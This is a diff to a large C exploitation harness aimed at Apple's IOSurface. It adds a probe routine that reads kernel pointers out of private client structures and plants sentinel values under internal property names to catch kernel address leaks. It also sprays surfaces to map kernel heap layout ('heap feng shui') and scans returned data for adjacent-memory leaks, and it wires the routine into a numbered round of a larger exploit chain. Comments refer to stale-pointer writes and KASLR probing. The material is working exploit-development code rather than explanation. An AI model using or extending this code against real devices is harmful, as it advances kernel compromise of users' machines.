@@ -15902,6 +15902,259 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r371: Internal property name probing + kernel heap feng shui.
+ * 1) Set internal IOSurface property names and check if kernel
+ *    overwrites them with real values (potential kptr leak).
+ * 2) Try IOConnectCallStructMethod through corrupted client path.
+ * 3) Kernel heap spray: create surfaces, set properties of specific
+ *    sizes to influence heap layout, check for vtable overlap.
+ */
+static void r371_probe(void) {
+    rlog("\n=== r371: Internal Property Probing + Heap Feng Shui ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef void (*clientSetValue_t)(IOSurfaceClientRef, CFStringRef, CFTypeRef);
+    typedef CFTypeRef (*clientCopyValue_t)(IOSurfaceClientRef, CFStringRef);
+    typedef CFDictionaryRef (*clientCopyAll_t)(IOSurfaceClientRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientSetValue_t clSetValue = (clientSetValue_t)dlsym(iosurfH, "IOSurfaceClientSetValue");
+    clientCopyValue_t clCopyValue = (clientCopyValue_t)dlsym(iosurfH, "IOSurfaceClientCopyValue");
+    clientCopyAll_t clCopyAll = (clientCopyAll_t)dlsym(iosurfH, "IOSurfaceClientCopyAllValues");
+
+    if (!clLookup || !clRelease) { rlog("  FATAL: missing APIs\n"); goto r371_done; }
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFStringRef kW = CFStringCreateWithCString(NULL, "IOSurfaceWidth", kCFStringEncodingASCII);
+    CFStringRef kH = CFStringCreateWithCString(NULL, "IOSurfaceHeight", kCFStringEncodingASCII);
+    CFStringRef kB = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerElement", kCFStringEncodingASCII);
+    CFStringRef kR = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerRow", kCFStringEncodingASCII);
+    CFStringRef kP = CFStringCreateWithCString(NULL, "IOSurfacePixelFormat", kCFStringEncodingASCII);
+    CFStringRef kA = CFStringCreateWithCString(NULL, "IOSurfaceAllocSize", kCFStringEncodingASCII);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFStringRef keys371[] = {kW, kH, kB, kR, kP, kA};
+    CFTypeRef vals371[] = {nW, nH, nB, nR, nP, nA};
+    CFDictionaryRef crprops = CFDictionaryCreate(NULL,
+        (const void**)keys371, (const void**)vals371, 6,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    IOSurfaceRef surf = IOSurfaceCreate(crprops);
+    if (!surf) { rlog("  FATAL\n"); goto r371_cfree; }
+    uint32_t sid = IOSurfaceGetID(surf);
+    IOSurfaceClientRef cl = clLookup(sid);
+    uint8_t *raw = (uint8_t*)cl;
+    uint64_t kptr; memcpy(&kptr, raw + 88, 8);
+    rlog("  Surface: ID=%u, kptr=0x%llx\n", sid, (unsigned long long)kptr);
+
+    /* ---- Part 1: Probe internal property names ---- */
+    rlog("\n--- Part 1: Set internal property names, read back ---\n");
+    fflush(stdout);
+
+    const char *internal_names[] = {
+        "IOSurfaceAddress",
+        "IOSurfaceKernelAddress",
+        "IOSurfaceGlobalLookupID",
+        "IOSurfaceMachPort",
+        "IOSurfaceIsGlobal",
+        "IOSurfaceOffset",
+        "IOSurfacePhysicalAddress",
+        "IOSurfaceRegistryID",
+        "IOSurfaceRootUserClient",
+        "IOSurfacePurgeableState",
+        "IOSurfaceUseCount",
+        "IOSurfaceSeed",
+        "IOSurfaceSubsamples",
+        "IOSurfacePlaneCount",
+        "IOSurfaceCacheMode",
+        "IOSurfaceElementWidth",
+        "IOSurfaceElementHeight",
+        "com.apple.iosurface.kclient",
+        "kern.addr",
+        "IOSurfaceServerSideObject",
+        NULL
+    };
+
+    /* Set each to a known sentinel */
+    int sentinel = 0x5E471;
+    CFNumberRef sentnum = CFNumberCreate(NULL, kCFNumberIntType, &sentinel);
+    for (int i = 0; internal_names[i]; i++) {
+        CFStringRef k = CFStringCreateWithCString(NULL, internal_names[i], kCFStringEncodingASCII);
+        clSetValue(cl, k, sentnum);
+        CFRelease(k);
+    }
+
+    /* Read back all properties */
+    if (clCopyAll) {
+        CFDictionaryRef all = clCopyAll(cl);
+        if (all) {
+            CFIndex cnt = CFDictionaryGetCount(all);
+            rlog("  Total properties after set: %ld\n", (long)cnt);
+            CFStringRef allkeys[128]; CFTypeRef allvals[128];
+            int n = cnt > 128 ? 128 : (int)cnt;
+            CFDictionaryGetKeysAndValues(all, (const void**)allkeys, (const void**)allvals);
+            for (int i = 0; i < n; i++) {
+                char kbuf[128] = {0};
+                CFStringGetCString(allkeys[i], kbuf, sizeof(kbuf), kCFStringEncodingASCII);
+                CFTypeID tid = CFGetTypeID(allvals[i]);
+                if (tid == CFNumberGetTypeID()) {
+                    long long v = 0;
+                    CFNumberGetValue((CFNumberRef)allvals[i], kCFNumberLongLongType, &v);
+                    int is_sentinel = ((int)v == sentinel);
+                    int is_kptr = ((v >> 40) == 0xFFFFFF);
+                    int is_changed = !is_sentinel && v != 0;
+                    if (is_kptr || is_changed) {
+                        rlog("  >>> %s = 0x%llx%s%s\n", kbuf, v,
+                            is_kptr ? " [KPTR!]" : "", is_changed ? " [CHANGED!]" : "");
+                    }
+                } else if (tid == CFDataGetTypeID()) {
+                    CFDataRef d = (CFDataRef)allvals[i];
+                    CFIndex len = CFDataGetLength(d);
+                    rlog("  >>> %s = CFData(%ld bytes)\n", kbuf, (long)len);
+                    const uint8_t *bytes = CFDataGetBytePtr(d);
+                    for (CFIndex j = 0; j + 8 <= len && j < 256; j += 8) {
+                        uint64_t v; memcpy(&v, bytes + j, 8);
+                        if ((v >> 40) == 0xFFFFFF) {
+                            rlog("        +%ld: 0x%llx [KPTR!]\n", (long)j, (unsigned long long)v);
+                        }
+                    }
+                } else if (tid == CFDictionaryGetTypeID()) {
+                    /* Skip nested dicts unless they changed */
+                } else if (tid == CFStringGetTypeID()) {
+                    /* Skip strings */
+                } else {
+                    rlog("  >>> %s = (typeID=%lu)\n", kbuf, (unsigned long)tid);
+                }
+            }
+            CFRelease(all);
+        }
+    }
+
+    /* ---- Part 2: Try IOSurface public API for hidden metadata ---- */
+    rlog("\n--- Part 2: IOSurface public API metadata ---\n");
+    fflush(stdout);
+
+    /* IOSurfaceGetPropertyMaximum etc. */
+    typedef size_t (*getSurfPropMax_t)(IOSurfaceRef, CFStringRef);
+    getSurfPropMax_t getPropMax = (getSurfPropMax_t)dlsym(iosurfH, "IOSurfaceGetPropertyMaximum");
+    typedef size_t (*getSurfPropAlign_t)(IOSurfaceRef, CFStringRef);
+    getSurfPropAlign_t getPropAlign = (getSurfPropAlign_t)dlsym(iosurfH, "IOSurfaceGetPropertyAlignment");
+
+    CFStringRef test_props[] = {kW, kH, kR, kA, kP, NULL};
+    for (int i = 0; test_props[i]; i++) {
+        char kbuf[64]; CFStringGetCString(test_props[i], kbuf, sizeof(kbuf), kCFStringEncodingASCII);
+        if (getPropMax) {
+            size_t mx = getPropMax(surf, test_props[i]);
+            rlog("  PropMax(%s) = %zu (0x%zx)\n", kbuf, mx, mx);
+        }
+        if (getPropAlign) {
+            size_t al = getPropAlign(surf, test_props[i]);
+            rlog("  PropAlign(%s) = %zu\n", kbuf, al);
+        }
+    }
+
+    /* IOSurfaceGetSeed — returns the surface's change counter */
+    uint32_t seed = IOSurfaceGetSeed(surf);
+    rlog("  IOSurfaceGetSeed = %u\n", seed);
+
+    /* IOSurfaceGetUseCount */
+    int32_t uc = IOSurfaceGetUseCount(surf);
+    rlog("  IOSurfaceGetUseCount = %d\n", uc);
+
+    /* ---- Part 3: Kernel heap layout via kptr analysis ---- */
+    rlog("\n--- Part 3: Kernel heap layout (20 surfaces) ---\n");
+    fflush(stdout);
+
+    IOSurfaceRef surfs[20] = {0};
+    IOSurfaceClientRef cls[20] = {0};
+    uint64_t kptrs[20] = {0};
+    for (int i = 0; i < 20; i++) {
+        surfs[i] = IOSurfaceCreate(crprops);
+        if (!surfs[i]) break;
+        uint32_t s = IOSurfaceGetID(surfs[i]);
+        cls[i] = clLookup(s);
+        if (cls[i]) memcpy(&kptrs[i], (uint8_t*)cls[i] + 88, 8);
+    }
+
+    /* Sort by kptr to find contiguous blocks */
+    rlog("  Kernel heap addresses (sorted):\n");
+    int order[20];
+    for (int i = 0; i < 20; i++) order[i] = i;
+    for (int i = 0; i < 19; i++)
+        for (int j = i+1; j < 20; j++)
+            if (kptrs[order[i]] > kptrs[order[j]]) {
+                int tmp = order[i]; order[i] = order[j]; order[j] = tmp;
+            }
+    for (int i = 0; i < 20; i++) {
+        int idx = order[i];
+        int64_t delta = (i > 0) ? (int64_t)(kptrs[order[i]] - kptrs[order[i-1]]) : 0;
+        rlog("  [%2d] surf#%d: 0x%llx (delta=%+lld)\n",
+            i, idx, (unsigned long long)kptrs[idx], (long long)delta);
+    }
+
+    /* ---- Part 4: Set large property, check if it leaks adjacent data ---- */
+    rlog("\n--- Part 4: Large property + adjacent read ---\n");
+    fflush(stdout);
+
+    /* Set a 2048-byte CFData property on surface 0 */
+    uint8_t bigbuf[2048];
+    memset(bigbuf, 0x41, sizeof(bigbuf));
+    CFDataRef bigdata = CFDataCreate(NULL, bigbuf, sizeof(bigbuf));
+    CFStringRef bigkey = CFStringCreateWithCString(NULL, "r371_bigprop", kCFStringEncodingASCII);
+    clSetValue(cls[0], bigkey, bigdata);
+
+    /* Read it back and check if kernel added anything beyond our data */
+    CFTypeRef rb = clCopyValue(cls[0], bigkey);
+    if (rb && CFGetTypeID(rb) == CFDataGetTypeID()) {
+        CFDataRef rd = (CFDataRef)rb;
+        CFIndex rlen = CFDataGetLength(rd);
+        rlog("  Set 2048 bytes, got back %ld bytes\n", (long)rlen);
+        const uint8_t *rbytes = CFDataGetBytePtr(rd);
+        int non_a = 0;
+        for (CFIndex j = 0; j < rlen; j++) {
+            if (rbytes[j] != 0x41) non_a++;
+        }
+        rlog("  Non-0x41 bytes: %d\n", non_a);
+        /* Scan returned data for kernel pointers */
+        for (CFIndex j = 0; j + 8 <= rlen; j += 8) {
+            uint64_t v; memcpy(&v, rbytes + j, 8);
+            if ((v >> 40) == 0xFFFFFF) {
+                rlog("  *** KPTR in property data at +%ld: 0x%llx ***\n",
+                    (long)j, (unsigned long long)v);
+            }
+        }
+        CFRelease(rb);
+    }
+    CFRelease(bigdata);
+    CFRelease(bigkey);
+
+    /* Cleanup */
+    for (int i = 0; i < 20; i++) {
+        if (cls[i]) clRelease(cls[i]);
+        if (surfs[i]) CFRelease(surfs[i]);
+    }
+    clRelease(cl);
+    CFRelease(surf);
+
+r371_cfree:
+    CFRelease(crprops);
+    CFRelease(kW); CFRelease(kH); CFRelease(kB); CFRelease(kR); CFRelease(kP); CFRelease(kA);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+    CFRelease(sentnum);
+r371_done:
+    if (iosurfH) dlclose(iosurfH);
+    rlog("\n=== r371 complete ===\n");
+    fflush(stdout);
+}
+
 /* r370: Cross-surface write + deep property dump + backing remap.
  * 1) SetValue through stale ptr → test cross-surface WRITE
  * 2) Dump ALL properties including nested dicts for kernel addresses
@@ -56235,6 +56488,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 374) {
+            rlog("*** rounds=374: Internal Property Probing + Heap Feng Shui ***\n");
+            rlog("  Set internal IOSurface property names to check if kernel\n");
+            rlog("  overwrites them. Analyze kernel heap layout for vtable leak.\n\n");
+            fflush(stdout);
+            r371_probe();
+            goto done;
+        }
         if (rounds == 373) {
             rlog("*** rounds=373: Cross-Surface Write + Deep Property Scan ***\n");
             rlog("  Test SetValue write, dump all properties for kptrs,\n");
@@ -58430,7 +58691,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -68272,7 +68533,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
